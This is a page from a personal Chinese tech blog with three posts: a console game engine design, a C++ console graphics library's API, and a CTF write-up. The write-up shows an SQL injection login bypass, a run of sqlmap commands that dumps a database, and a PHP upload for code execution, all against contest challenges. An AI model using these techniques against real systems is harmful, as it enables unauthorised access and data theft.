+      <a class="article-title" href="/2020/04/05/InfantGameEngine/">在命令行上玩出花:InfantGameEngine</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>InfantGameEngine，婴儿级游戏引擎，虽然它只能显示简单的游戏画面。但它可以支持你写非常复杂的游戏逻辑。</p>
+<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p>Tip：源码已经放在github上了，建议参照源码阅读～</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/TOXICAKE/InfantGameEngine.git">https://github.com/TOXICAKE/InfantGameEngine.git</a></p>
+<p>觉得有趣的话记得给一颗星XD</p>
+<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="储存字符"><a href="#储存字符" class="headerlink" title="储存字符"></a>储存字符</h2><p>显示在屏幕上的每一个字符都具有多个属性，所以可以用结构体来记录每一个字符。这样就引出了**实体(Entity)**这个概念，每一个字符都是Entity类的实例，称作一个实体，然后用链式结构关联每一个实体。这样只需要遍历就可以取到所有的实体，以及它们其中的数据。</p>
+<h2 id="刷新机制"><a href="#刷新机制" class="headerlink" title="刷新机制"></a>刷新机制</h2><p>每帧都刷新显示所有字符是不可能的，所以应该采用局部刷新的方法。假如一个实体向右移动一格，那么就是在右侧输出这个实体的字符，并在原来的位置上输出被遮挡的字符。<img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81.png" alt="局部刷新机制"></p>
+<h2 id="碰撞机制"><a href="#碰撞机制" class="headerlink" title="碰撞机制"></a>碰撞机制</h2><p>实体应该具有一个参数**碰撞(Collision)**，两个有碰撞实体彼此不能穿过，两个实体间如果有至少一方是无碰撞的则它们彼此可以穿过。这就是基本的碰撞机制。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%202.png" alt="简单演示一下碰撞机制"></p>
+<h2 id="实体组"><a href="#实体组" class="headerlink" title="实体组"></a>实体组</h2><p>显然，我们不能总是让开发者以实体为单位去开发游戏，例如马里奥是32*32像素的，程序移动马里奥是以整个马里奥为单位去移动的，我们也应该向开发者提供以组为单位的开发方式。我选用了二级链表来实现，即实体组之间连接，每个节点又是新的实体链的头节点。<img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%203.png" alt="实体组的数据结构"></p>
+<h1 id="交付"><a href="#交付" class="headerlink" title="交付"></a>交付</h1><p>为了使游戏显示效果尽可能的好，刷新应该在移动后进行，所以刷新应该交付给各个会产生实体位置移动的函数。</p>
+<p>碰撞检查也是发生在移动过程中的，也应该交付给各个会产生实体位置移动的函数。</p>
+<p>实体移动到新位置时，应该要把新位置上的实体保存下来（如果有）。但除了在移动时要保存，在创建新实体时也要保存。</p>
+<h1 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h1><h2 id="实体移动-En-Move"><a href="#实体移动-En-Move" class="headerlink" title="实体移动 En_Move"></a>实体移动 En_Move</h2><p>实体的移动是引擎最基本的功能，包括的内容很多，但是逻辑并不复杂。接受的参数应该是实体的编号（id），运动方向（direction)，距离(distance)。</p>
+<p>首先是检查对应方向上的可移动距离。如果移动的实体本身的碰撞属性是off，则不需要考虑与其他实体的碰撞问题，只用检查移动完是否在画布内即可。如果碰撞属性是on，则循环检查时就要同时考虑检查位置上的实体碰撞属性，如果同为on，则可移动距离就是到这个实体的距离。</p>
+<p>计算出可移动距离，如果比distance大，则可以移动distance那么远，否则的话移动到最大可移动距离停下。<img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%204.png" alt="实体移动演示"></p>
+<h2 id="构成实体组-AddEnToGr"><a href="#构成实体组-AddEnToGr" class="headerlink" title="构成实体组 AddEnToGr"></a>构成实体组 AddEnToGr</h2><p>实例化一个实体组对象后，使用这个函数将一个实体加入到组中去，代码也很简单，就是普通的在实体链后面加一个节点而已。</p>
+<h2 id="实体组移动-Gr-Move"><a href="#实体组移动-Gr-Move" class="headerlink" title="实体组移动 Gr_Move"></a>实体组移动 Gr_Move</h2><p>实体组的移动其实就是对每个实体进行实体移动而已，但实际上的代码逻辑要稍微复杂一点。</p>
+<p>首先循环计算每一个组内实体的可移动距离，再求出其中的最小值。这个最小值就是这个实体组实际上可以移动的距离。<img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%205.png" alt="实体组移动演示"></p>
+<p>但是，如果之间调用之前写好的实体移动函数则会出现刷新显示上的问题。</p>
+<p>因为是顺序结构，所以实体组中的实体也是按序移动，顺序与每条AddEnToGr执行顺序一致，这样就导致如果显示位置在前（沿移动方向）的实体移动顺序排在后面，就会遮挡先前移动好的实体。如下图所示，按ABC顺序添加进组中的三个实体，向右移动一格，最后画面上只会剩下C。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%206.png" alt="bug"></p>
+<p>解决办法就是等所有实体移动完后再刷新遮挡的实体，最后刷新移动后的实体。</p>
+<h2 id="实体组旋转-Gr-Spin"><a href="#实体组旋转-Gr-Spin" class="headerlink" title="实体组旋转 Gr_Spin"></a>实体组旋转 Gr_Spin</h2><p>旋转也应该是引擎提供的功能。开发者提供旋转中心和旋转方向，就可以直接以组为单位旋转。可以简单的分为几步来实现，计算所有实体旋转后应该在的位置，然后检查移动路径上是否有阻碍，如果有，则不能旋转。确定旋转后位置的算法，（我用象棋棋盘找到的，并不复杂）。在算法上，第一步是确定实体所在的象限，再在象限内判断实体在45度线的那半边。还有特殊的实体恰好在分界线上的情况。下图是我的演草纸，动手画图找到规律就可以了。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%BC%94%E8%8D%89%E7%BA%B8.png" alt="演草纸"></p>
+<p>这部分代码比较费神，实际上最后的代码应该可以优化，但是我已经没有心情去做了。</p>
+<h1 id="API的设置"><a href="#API的设置" class="headerlink" title="API的设置"></a>API的设置</h1><p>我在开发好基本功能后就去写了小demo来测试，最后写了“七巧板”来做最终的测试，中间的api也是越加越多，除了实体的信息要有api来提供以外，总的实体数目，组的个数还有组内实体总数也都需要提供。还要可以多种方式查询，比如获得实体可以通过实体编号，也可以通过组和组内实体编号，还可以通过画布的坐标。</p>
+<h1 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h1><p>它的实际使用效果很不错，因为我们在开发时提供的功能比较完善，没有过多的限制，并且是直接的api调用编程，比较灵活。</p>
+<p>开发过程中最重要的是实体的管理，如果实体没有管理好，整个代码看起来就会相当糟糕。</p>
+<p>实体就是“实际”存在的意思，他具体是什么由程序员的代码来决定。例如你可以在实体类中增加一个变量Key，程序员在设计游戏时就可以给key赋值，例如1代表构成主角的实体，2代表按钮，3代表门。</p>
+<p>测试程序和测试源码都可以在github上找到。</p>
+<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>你大概不会真的动手去写一个，也可能会觉得它没什么用。我们是直接接触框架的一代，这些东西除了作为上学时的作业，几乎毫无用处，我们上面在讨论的东西，也是之前<strong>雅达利</strong>思考过的东西，他们当时的开发环境还要更为恶劣一些。</p>
+<p>命令行也可以做出很有趣的游戏，画面并不是游戏的唯一要素。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%88%AA%E5%B1%8F2020-04-07%20%E4%B8%8A%E5%8D%8811.10.55.png" alt="大灾变：劫后余生"></p>
+<p>当然还有著名的生命游戏。</p>
+<p>谢谢你花时间阅读这篇博客。：）</p>
+<p>在评论区留个脚印吧～</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cdn.n0p3.cn/2020/04/05/InfantGameEngine/" data-id="cleqs4p6r000ah4d70hq5auth" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" rel="tag">命令行</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-i春秋-新春战疫" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/25/i%E6%98%A5%E7%A7%8B-%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB/" class="article-date">
+  <time datetime="2020-02-25T02:07:44.000Z" itemprop="datePublished">2020-02-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/02/25/i%E6%98%A5%E7%A7%8B-%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB/">i春秋 新春战疫WriteUp</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这次公开赛并没有怎么花时间打，总共就做出两道web。<em>（花时间也不会做）</em></p>
+<p>以下是这两道题的wp</p>
+<h1 id="招聘系统"><a href="#招聘系统" class="headerlink" title="招聘系统"></a>招聘系统</h1><p>可以注册一个账号进入，会发现有一个页面需要管理员权限</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204657.png"></p>
+<p>在登录框处存在sql注入漏洞，单引号闭合后，用井号注释掉后面的语句，即可任意密码登陆管理员。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204612.png">打开那个需要管理员的页面</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204802.png"></p>
+<p>想到此处可能存在sql注入</p>
+<p>加单引号和井号后页面加载时间异常</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204824.png"></p>
+<p>很可能可以注入</p>
+<p>抓个包，居然是get。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20205250.png"></p>
+<p>放进sqlmap跑一下</p>
+<p><code>sqlmap -r flag.txt </code></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20205444.png"></p>
+<p>找到变量key存在注入</p>
+<p>爆个库，</p>
+<p><code>sqlmap -r flag.txt --dbs</code></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210011.png"></p>
+<p>nzhaopin应该就是flag在的库</p>
+<p>再暴个表</p>
+<p><code>sqlmap -r flag.txt -D nzhaopin --tables</code></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210052.png"></p>
+<p>找到flag表</p>
+<p>暴一下字段</p>
+<p><code>sqlmap -r flag.txt -D nzhaopin -T flag --columns</code></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210152.png"></p>
+<p>看到flaaag字段</p>
+<p>暴flaaag字段</p>
+<p><code>sqlmap -r flag.txt -D nzhaopin -T flag -C &quot;flaaag&quot; --dump</code></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210303.png"></p>
+<p>Get flag.</p>
+<p>本题手注wp可以参考 <a target="_blank" rel="noopener" href="https://www.yuque.com/r1car/tnf7vi/rp443a">1ight师傅的wp</a></p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>先随意上传一个文件，抓包</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20203307.png"></p>
+<p>把文件后缀改php，文件内容改成一段脚本，上传后访问上传到的位置。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204040.png"></p>
+<p>发现可以执行任意代码。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204238.png"></p>
+<p>看到当前位置后，向后访问</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20203841.png"></p>
+<p>最后在这个目录下找到了flag</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204317.png"></p>
+<p>直接用cat命令读不到flag，好像flag文件本来就是空的。</p>
+<p>运行readflag程序</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204354.png"></p>
+<p>Get flag.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cdn.n0p3.cn/2020/02/25/i%E6%98%A5%E7%A7%8B-%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB/" data-id="cleqs4p700010h4d74uiaflhc" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%82%E5%8A%A0%E7%9A%84%E6%AF%94%E8%B5%9B/" rel="tag">参加的比赛</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-C-Windows-XzyGraphics图形库" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/10/C-Windows-XzyGraphics%E5%9B%BE%E5%BD%A2%E5%BA%93/" class="article-date">
+  <time datetime="2020-02-10T12:12:03.000Z" itemprop="datePublished">2020-02-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/02/10/C-Windows-XzyGraphics%E5%9B%BE%E5%BD%A2%E5%BA%93/">C++,Windows,XzyGraphics图形库</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[TOC]</p>
+<h1 id="基本内容"><a href="#基本内容" class="headerlink" title="基本内容"></a>基本内容</h1><p><strong>坐标：</strong><br>左上角为原点，x轴向右延伸，y轴向下延伸，无负坐标。<br>使用GOTOXY函数来控制光标位置。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GOTOXY</span>(<span class="number">1</span>,<span class="number">1</span>)<span class="comment">//控制光标至控制台左上角</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>颜色：</strong><br>下划线加颜色单词，例如_Red为红色。<br>下划线前加<strong>H</strong>代表高亮,H_Red为高亮红。<br>高亮灰H_Gray为白色。<br>所有的颜色单词可以在头文件中看到。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SETCOLOR</span>(_Green,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">//执行后接下来程序的输出颜色就是绿色了，</span></span><br><span class="line"><span class="comment">//后两个参数是颜色修改失败时报错信息的输出位置</span></span><br></pre></td></tr></table></figure>
+<p><strong>光标：</strong><br>光标的显示与隐藏可以使用<strong>GUANGBIAO</strong>函数来控制。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GUANGBIAO</span>(<span class="number">0</span>);<span class="comment">//0为不显示，1为显示</span></span><br></pre></td></tr></table></figure>
+<p><strong>输出：</strong><br>封装了一个输出函数<strong>SAY</strong></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SAY</span>(H_Green,<span class="number">4</span>,<span class="number">5</span>,<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line"><span class="comment">//在（4，5）位置输出一个高亮的绿色Hello World！</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="绘制函数"><a href="#绘制函数" class="headerlink" title="绘制函数"></a>绘制函数</h2><p><strong>ANYLINE</strong>函数是用来画横线的</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ANYLINE</span>(_Blue,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="string">&quot;+&quot;</span>,<span class="number">1</span>);<span class="comment">//这条语句将会在（2，3）的位置输出5次+，每次输出后向右移动1个单位。</span></span><br></pre></td></tr></table></figure>
+<p><strong>VERTICALLINE</strong>函数是用来画竖线的</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VERTICALLINE</span>(_Yellow,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="string">&quot;|&quot;</span>);<span class="comment">//从（4，5）开始向下输出7次 |。</span></span><br></pre></td></tr></table></figure>
+<p><strong>DRAW_SQURE</strong>函数用来画方框</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DRAW_SQURE</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">7</span>,_Green,<span class="string">&quot;+&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//很简单，看看变量名就知道了</span></span><br></pre></td></tr></table></figure>
+<p>绘制函数基本上还没有怎么写，以后会有更多方便的绘制函数。主要的内容在下面。</p>
+<h1 id="FORM类"><a href="#FORM类" class="headerlink" title="FORM类"></a>FORM类</h1><p>FORM是一个可以生成选单的类</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> selection = <span class="number">0</span>;</span><br><span class="line"><span class="function">FORM <span class="title">HELP</span><span class="params">(<span class="number">3</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">2</span>)</span></span>;<span class="comment">//实例化一个选单对象HELP</span></span><br><span class="line">HELP.title = <span class="string">&quot;Developer  N0P3&quot;</span>;<span class="comment">//设置选单的标题</span></span><br><span class="line">HELP.TitleColor = H_GreenBlue;<span class="comment">//设置标题的颜色</span></span><br><span class="line">HELP.<span class="built_in">SETOPTIONNAME</span>(<span class="number">0</span>, <span class="string">&quot;键入限制函数 ENTER&quot;</span>);<span class="comment">//设置0号选项名字</span></span><br><span class="line">HELP.<span class="built_in">SETOPTIONNAME</span>(<span class="number">1</span>, <span class="string">&quot;选单类 FORM&quot;</span>);<span class="comment">//设置1号选项名字</span></span><br><span class="line">HELP.<span class="built_in">SETOPTIONNAME</span>(<span class="number">2</span>, <span class="string">&quot;绘制函数组&quot;</span>);<span class="comment">//设置2号选项名字</span></span><br><span class="line">HELP.<span class="built_in">SETOPTIONNAME</span>(<span class="number">3</span>, <span class="string">&quot;其他&quot;</span>);<span class="comment">//设置3号选项名字</span></span><br><span class="line">selection = HELP.<span class="built_in">SELECTION</span>(<span class="number">10</span>, <span class="number">0</span>, <span class="number">14</span>);<span class="comment">//展开选单并让用户选择</span></span><br><span class="line"><span class="comment">//只需要简单的几行就可以构造一个完整的选择菜单</span></span><br></pre></td></tr></table></figure>
+<p>实例化一个选单对象时，前四个参数指定了生成位置左上角横纵坐标和右下角横纵坐标，最后两个是横向选项个数和纵向选项个数。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.23.03.png" alt="自动生成的2x2选择菜单"><br>&#x2F;&#x2F;觉得丑(?)可以自定义颜色和符号</p>
+<h2 id="主要成员变量"><a href="#主要成员变量" class="headerlink" title="主要成员变量"></a>主要成员变量</h2><p><strong>字符串（string）：</strong><br>选单标题<strong>title</strong>，构成选单的字符<strong>FormStr</strong><br>，构成选项的字符<strong>OptionStr</strong>.</p>
+<p><strong>整型 (int):</strong></p>
+<p>选单的左上角坐标<strong>x1,y1</strong><br>选单的右下角坐标<strong>x2,y2</strong><br>选单标题的颜色<strong>TitleColor</strong><br>每行选项个数<strong>optionX</strong><br>每列选项个数<strong>optionY</strong></p>
+<h2 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h2><p><strong>选择函数SELECTION：</strong><br>共接收三个整型参数：<br>选单外框颜色<strong>COLOR_form</strong><br>选项的颜色<strong>COLOR_option</strong><br>选项名的颜色<strong>COLOR_str</strong></p>
+<p>返回值为整型，返回的是选项的值。选项的值默认从0开始按从上到下，从左到右的顺序直至最后一个选项。</p>
+<p>函数调用后会在控制台展开一个选单，wsad（小写）控制高亮显示的选项，按下回车则函数返回选项的值，esc键退出选择返回值 -1。</p>
+<p>使用后的选单不会清理自己。</p>
+<p><strong>清空函数CLEAR：</strong><br>不需要参数，调用后清理选单所在的位置<br>无返回值</p>
+<p><strong>设置值函数SETVALUE：</strong><br>需要两个整型参数：<br>选项编号<strong>id</strong><br>修改的值<strong>InValue</strong><br>无返回值。</p>
+<p><strong>获得值函数GETVALUE：</strong><br>提供选项编号<strong>id</strong>，返回选项的值。</p>
+<p><strong>设置选项名函数SETOPTIONNAME：</strong><br>提供选项编号<strong>id</strong>和选项名<strong>InName</strong>，默认选项没有名字。</p>
+<p><strong>获得选项值函数GETOPTIONNAME：</strong><br>提供选项编号<strong>id</strong>，返回选项的名字。</p>
+<p><strong>获得选项坐标函数GETOPTIONXY：</strong><br>需要提供选项<strong>id</strong>和两个用于储存选项坐标的整型变量。</p>
+<p><strong>绘制函数DRAW：</strong><br>同样需要三个整型参数：<br>选单外框颜色<strong>COLOR_form</strong><br>选项的颜色<strong>COLOR_option</strong><br>选项名的颜色<strong>COLOR_str</strong><br>绘制函数会在屏幕上绘制选单。<br>无返回值</p>
+<p><strong>测试函数TEST：</strong><br><em>这个函数旨在开发阶段帮助开发者调整合适的选单参数。</em></p>
+<p>不需要参数。</p>
+<p> 执行后方框会集中在左上角，wasd和ijkl分别控制方框的左上角和右下角，如果发生诡异的显示状况，可能是右下角不再是右下角导致的。<br>建议在使用的时候先控制右下角远离左上角。</p>
+<p>按下**[ENTER]<strong>预览生成效果，再按一次回到移动模式。按下</strong>[TAB]**键可以隐藏方框，再按一次显示方框。</p>
+<h1 id="输入限制函数ENTER"><a href="#输入限制函数ENTER" class="headerlink" title="输入限制函数ENTER"></a>输入限制函数ENTER</h1><p>这个函数在写图形界面时非常实用。<br>如果使用cin接收用户输入的话，用户可以通过输入换行和空格破坏画面。<br>使用ENTER函数就可以限制用户的输入。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ENTER</span>(H_Gray,<span class="number">5</span>,<span class="number">7</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//指定颜色为白色，在（5，7）的位置输入，并最长为10个字符超过会闪红色。</span></span><br></pre></td></tr></table></figure>
+<p>但是并不能正确处理宽字节，也就无法输入中文。<br>后续的更新会解决这个问题。</p>
+<h1 id="SCROLL-LIST类"><a href="#SCROLL-LIST类" class="headerlink" title="SCROLL_LIST类"></a>SCROLL_LIST类</h1><p>SCROLL_LIST是一个可以生成滚动信息栏的类</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SCROLL_LIST <span class="title">TestList</span><span class="params">(<span class="number">5</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">7</span>)</span></span>;</span><br><span class="line">TestList.title = <span class="string">&quot;信息栏&quot;</span>;</span><br><span class="line">TestList.TitleColor = H_Yellow;</span><br><span class="line">TestList.<span class="built_in">DRAW</span>(H_Blue);</span><br><span class="line">TestList.<span class="built_in">CREATERECORD</span>(H_Green, <span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">TestList.<span class="built_in">CREATERECORD</span>(H_GreenBlue, <span class="string">&quot;[N0P3]:&quot;</span>, H_Gray, <span class="string">&quot;Hello World!&quot;</span>, H_Green, <span class="string">&quot;   --OK&quot;</span>);</span><br><span class="line"><span class="comment">//最后看起来很长的代码其实非常简单</span></span><br></pre></td></tr></table></figure>
